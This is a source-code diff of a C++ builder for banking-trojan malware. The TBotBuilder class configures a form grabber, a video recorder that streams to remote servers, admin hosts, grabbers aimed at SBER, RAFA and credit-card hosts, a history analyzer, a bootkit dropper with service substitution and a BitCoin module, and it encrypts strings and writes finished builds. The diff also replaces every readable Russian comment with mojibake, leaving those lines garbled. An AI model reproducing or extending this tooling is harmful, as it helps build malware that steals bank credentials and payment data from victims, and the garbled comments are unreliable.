+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TMainPassword::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
 {
@@ -562,7 +573,7 @@ void TMainPassword::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
 
 
 //*****************************************************************
-//  Класс базового модуля параметров бота
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*****************************************************************
 __fastcall TCustomBotModule::TCustomBotModule(TComponent* AOwner)
 	: TComponent(AOwner)
@@ -601,7 +612,7 @@ void TCustomBotModule::RemoveItem(TBotParam* Param)
 //---------------------------------------------------------------------------
 
 //--------------------------------------------------
-//  Функция очищает список параметров
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TCustomBotModule::Clear()
 {
@@ -615,7 +626,7 @@ void TCustomBotModule::Clear()
 
 
 //--------------------------------------------------
-//  Функция очищает сессинные параметры
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TCustomBotModule::ClearSessionParams()
 {
@@ -629,7 +640,7 @@ void TCustomBotModule::ClearSessionParams()
 
 
 //--------------------------------------------------
-//  Функция возвращает количество параметров модуля
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 int  TCustomBotModule::GetCount()
 {
@@ -637,8 +648,8 @@ int  TCustomBotModule::GetCount()
 }
 
 //--------------------------------------------------
-//  Функция возвращает признак активности модуля
-//  т.е. хотябы один параметр модуля есть в сборке
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅ.пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TCustomBotModule::GetActive()
 {
@@ -652,7 +663,7 @@ bool TCustomBotModule::GetActive()
 
 
 //--------------------------------------------------
-//  Функция возвращает элемент по его индексу
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 TBotParam* TCustomBotModule::GetItems(int Index)
 {
@@ -660,7 +671,7 @@ TBotParam* TCustomBotModule::GetItems(int Index)
 }
 
 //--------------------------------------------------
-//  Функция сбрасывает состояние параметров
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TCustomBotModule::ResetParamsStatus()
 {
@@ -669,8 +680,8 @@ void TCustomBotModule::ResetParamsStatus()
 }
 
 //--------------------------------------------------
-//  Функция обновляет информацию о наличии
-//  параметров в буфере
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TCustomBotModule::UpdateParamsStatus(const char* FileName)
 {
@@ -694,7 +705,7 @@ bool TCustomBotModule::UpdateParamsStatus(const char* FileName)
 
 
 //--------------------------------------------------
-//  Функция записывает параметры модуля в буфер
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TCustomBotModule::WriteParams(LPBYTE Buf, DWORD BufSize)
 {
@@ -709,8 +720,8 @@ bool TCustomBotModule::WriteParams(LPBYTE Buf, DWORD BufSize)
 }
 
 //--------------------------------------------------
-//  Функция возвращает параметр позиция которого
-//  находится в позиции Position
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Position
 //--------------------------------------------------
 TBotParam* TCustomBotModule::GetParamForPos(int Position)
 {
@@ -726,7 +737,7 @@ TBotParam* TCustomBotModule::GetParamForPos(int Position)
 
 
 //--------------------------------------------------
-//  Функция очищает значения параметров
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TCustomBotModule::ClearValues()
 {
@@ -735,7 +746,7 @@ void TCustomBotModule::ClearValues()
 }
 
 //--------------------------------------------------
-//  Функция возвращает параметр по имени
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 TBotParam* TCustomBotModule::ParamByName(const AnsiString &Name)
 {
@@ -749,7 +760,7 @@ TBotParam* TCustomBotModule::ParamByName(const AnsiString &Name)
 }
 
 
-// Функция проверяет состояние параметров
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 TBotParamStatus TCustomBotModule::CheckParamsValue(TStrings* Errors, bool FullBuild)
 {
 	TBotParamStatus Result = psOk;
@@ -763,12 +774,12 @@ TBotParamStatus TCustomBotModule::CheckParamsValue(TStrings* Errors, bool FullBu
 		TBotParamStatus Status = Param->ValueStatus();
 		if (Status == psOk) continue;
 
-		// Более высокое значение статуса означает
-		// большую критичность состояния
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Status > Result)
 			Result = Status;
 
-		// Добавляем строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Errors)
 		{
 			UnicodeString Str;
@@ -793,7 +804,7 @@ TBotParamStatus TCustomBotModule::CheckParamsValue(TStrings* Errors, bool FullBu
 
 
 //*****************************************************************
-//  Модуль базовых настроек бота
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*****************************************************************
 __fastcall TBaseBotModule::TBaseBotModule(TComponent* AOwner)
 	: TCustomBotModule(AOwner)
@@ -812,16 +823,16 @@ __fastcall TBaseBotModule::~TBaseBotModule()
 }
 
 //--------------------------------------------------
-//  Функция открывает файл сборки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 UnicodeString TBaseBotModule::GetResultFileName()
 {
-	// Если имя файла задалось принудительно то выходим
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	UnicodeString Name = FPrefix->AsString;
 	if (Name.IsEmpty())
 		Name = "ResultBuild";
 
-	// Собираем имя
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	UnicodeString Path = ExtractFilePath(FFileName);
 	UnicodeString Ext  = ExtractFileExt(FFileName);
 
@@ -834,7 +845,7 @@ UnicodeString TBaseBotModule::GetResultFileName()
 
 
 //--------------------------------------------------
-//  Функция открывает файл сборки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBaseBotModule::Open(const UnicodeString &FileName)
 {
@@ -849,7 +860,7 @@ bool TBaseBotModule::Open(const UnicodeString &FileName)
 
 
 //--------------------------------------------------
-//  Функция закрывает открытый файл
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBaseBotModule::Close()
 {
@@ -859,7 +870,7 @@ bool TBaseBotModule::Close()
 
 
 //--------------------------------------------------
-//  Функция создаёт сборку
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBaseBotModule::Build(bool FullBuild)
 {
@@ -867,25 +878,25 @@ bool TBaseBotModule::Build(bool FullBuild)
 
 	WriteDisabledParams = FullBuild;
 
-	// Открываем файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	DWORD  Size = 0;
 	LPBYTE Buf = File::ReadToBufferW(FFileName.w_str(), Size);
     if (!Buf) return false;
 
-	// Собираем билд
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	DoBeforeBuild(Buf, Size);
 	bool Result = WriteParams(Buf, Size);
 
-	// Сохраняем результат
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Result)
 	{
 		Result = File::WriteBufferW(ResultFileName.w_str(), Buf, Size) == Size;
 	}
 
-	// Уничтожаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	MemFree(Buf);
 
-	// Проверяем результат сборки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Result)
 	{
 		TBuildChecker* Checker = new TBuildChecker(NULL, this);
@@ -903,7 +914,7 @@ bool TBaseBotModule::Build(bool FullBuild)
 //===========================================================================
 
 //*****************************************************************
-//  Модуль дополнительных настроек бота
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*****************************************************************
 
 __fastcall TBotModule::TBotModule(TBotBuilder *ABuilder, const UnicodeString &Name)
@@ -921,8 +932,8 @@ __fastcall TBotModule::~TBotModule()
 }
 
 //--------------------------------------------------
-//  Добавление параметров переводим владельцу
-//  модуля
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotModule::InsertItem(TBotParam* Param)
 {
@@ -941,8 +952,8 @@ void TBotModule::Clear()
 }
 
 //--------------------------------------------------
-//  функция возвращает истину если модуль может
-//  быть отредактирован
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotModule::CanEdit()
 {
@@ -951,7 +962,7 @@ bool TBotModule::CanEdit()
 
 
 //--------------------------------------------------
-//  функция активирует редактор модуля
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotModule::Edit()
 {
@@ -965,7 +976,7 @@ bool TBotModule::Edit()
 
 
 //*****************************************************************
-//  Модуль дополнительных настроек бота
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*****************************************************************
 __fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
 	: TBaseBotModule(AOwner)
@@ -973,73 +984,73 @@ __fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
 	FModules = new TList();
 	FEncryptDlls = true;
 
-    // Создаём парамт пароля шифрования строк
+    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	FSessionPassword = new TBotParam(this, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, false, false, "");
 	FSessionPassword->IsDynamic = true;
 	FSessionPassword->AsString  = "---";
 
-	// Создаём криптор строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	FSringsEncryptor = new TBotStringsEncryptor(this);
 	FSringsEncryptor->Password = FSessionPassword;
 
-	// Инициализируем дополнительные модули
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	TBotModule* Module;
 
-	// Модуль Hunter
+	// пїЅпїЅпїЅпїЅпїЅпїЅ Hunter
 	Module = new TBotModule(this, Module_Hunter);
-	new TBotParam(Module, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, HUNTER_PARAM_ENCRYPTED, false, "Ссылки модуля Hunter");
+	new TBotParam(Module, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, HUNTER_PARAM_ENCRYPTED, false, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Hunter");
 
-	// Модуль формграбера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = new TBotModule(this, Module_FormGraber);
-	new TBotParam(Module, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, FGRFILTER_PARAM_ENCRYPTED_URLS, false, "Ссылки формграбера");
-	new TBotParam(Module, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, false, "Маски пост данных");
+	new TBotParam(Module, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, FGRFILTER_PARAM_ENCRYPTED_URLS, false, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+	new TBotParam(Module, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, false, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Нстройки видеорекордера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = new TBotModule(this, Module_VideoRecorder);
-	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, true,  "Сервер записи видео №1");
-	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, false, "Сервер записи видео №2");
-	new TBotParam(Module, VIDEOREC_PARAM_NAME_URLS, VIDEOREC_PARAM_SIZE_URLS, VIDEOREC_PARAM_ENCRYPTED_URLS,  false, "Адреса старта записиси видео");
+	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, true,  "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ1");
+	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, false, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ2");
+	new TBotParam(Module, VIDEOREC_PARAM_NAME_URLS, VIDEOREC_PARAM_SIZE_URLS, VIDEOREC_PARAM_ENCRYPTED_URLS,  false, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 
 	// JAVA Config
 //	Module = new TBotModule(this, Module_JavaConfig);
-//	new TBotParam(Module, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, JAVA_PARAM_ENCRYPTED, true, "Ссылки JAVA");
+//	new TBotParam(Module, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, JAVA_PARAM_ENCRYPTED, true, "пїЅпїЅпїЅпїЅпїЅпїЅ JAVA");
 
-	// Настройки AZ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ AZ
 	Module = new TBotModule(this, Module_AzConfig);
-	new TBotParam(Module, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, AZCONFIG_PARAM_ENCRYPTED_AZUSER, true, "Имя пользователя AZ");
-	new TBotParam(Module, AZCONFIG_PARAM_NAME_HOSTS,  AZCONFIG_PARAM_SIZE_HOSTS,  AZCONFIG_PARAM_ENCRYPTED_HOSTS,  true, "Хосты AZ админки");
+	new TBotParam(Module, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, AZCONFIG_PARAM_ENCRYPTED_AZUSER, true, "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ AZ");
+	new TBotParam(Module, AZCONFIG_PARAM_NAME_HOSTS,  AZCONFIG_PARAM_SIZE_HOSTS,  AZCONFIG_PARAM_ENCRYPTED_HOSTS,  true, "пїЅпїЅпїЅпїЅпїЅ AZ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-	// Настройки грабера сбер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //	Module = new TBotModule(this, Module_SberHosts);
-//	new TBotParam(Module, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, SBERHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера SBER");
+//	new TBotParam(Module, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, SBERHOSTS_PARAM_ENCRYPTED, true, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ SBER");
 
-	// Настройки параметров рафы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //	Module = new TBotModule(this, Module_RafaHosts);
-//	new TBotParam(Module, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, RAFAHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера RAFA");
+//	new TBotParam(Module, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, RAFAHOSTS_PARAM_ENCRYPTED, true, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ RAFA");
 
-	// Настройки системы CC
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ CC
 //	Module = new TBotModule(this, Module_CCHosts);
-//	new TBotParam(Module, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, ССHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера CC");
+//	new TBotParam(Module, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, пїЅпїЅHOSTS_PARAM_ENCRYPTED, true, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ CC");
 
-	// Настройки анализатора истории навигации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = new TBotModule(this, Module_HistoryAnalyzer);
-	new TBotParam(Module, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, true, "Ссылки анализатора истории навигации");
+	new TBotParam(Module, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, true, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 
-	// Настройки дропера буткита
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TBotParam *p;
 	Module = new TBotModule(this, Module_BootkitDroper);
-		new TBotParam(Module, Param_DroperNamePrefix, 0, false, true, "Превикс дропера буткита");
-		new TBotParam(Module, Param_TargetPlatform,   0, false, true, "Платформа назначения дропера буткита");
-	p = new TBotParam(Module, Param_SVCFuckupEnabled, 0, false, true, "Использовать SVC подмену дропером буткита");
+		new TBotParam(Module, Param_DroperNamePrefix, 0, false, true, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+		new TBotParam(Module, Param_TargetPlatform,   0, false, true, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+	p = new TBotParam(Module, Param_SVCFuckupEnabled, 0, false, true, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SVC пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	p->AsString = "0";
 
 
-	// Модуль
+	// пїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = new TBotModule(this, Module_BitCoin);
 
 	new TBotParam(Module, BITCOIN_PARAM_NAME_HOSTS, BITCOIN_PARAM_SIZE_HOSTS,
-				  BITCOIN_PARAM_ENCRYPTED_HOSTS, false, "Хсты модуля BitCoint");
+				  BITCOIN_PARAM_ENCRYPTED_HOSTS, false, "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ BitCoint");
 
 }
 
@@ -1052,12 +1063,12 @@ __fastcall TBotBuilder::~TBotBuilder()
 
 
 //--------------------------------------------------
-//  Функция сохраняет значения параметров в поток
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 void TBotBuilder::SaveToStream(TStream *Stream)
 {
 
-	// Записываем загоовок файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	TBuilderFileHeader H;
 	H.Signature = BUILDER_FILE_SIGNATURE;
 	H.Version   = BUILDER_VERSION;
@@ -1065,7 +1076,7 @@ void TBotBuilder::SaveToStream(TStream *Stream)
 
 	Stream->Write(&H, sizeof(H));
 
-	// Записываем параметры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (int i = 0; i < Count; i++)
 	{
 		TBotParam* P = Items[i];
@@ -1073,7 +1084,7 @@ void TBotBuilder::SaveToStream(TStream *Stream)
 
 		DWORD NameLen = P->Name.Length();
 
-		// Записываем имя парамера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
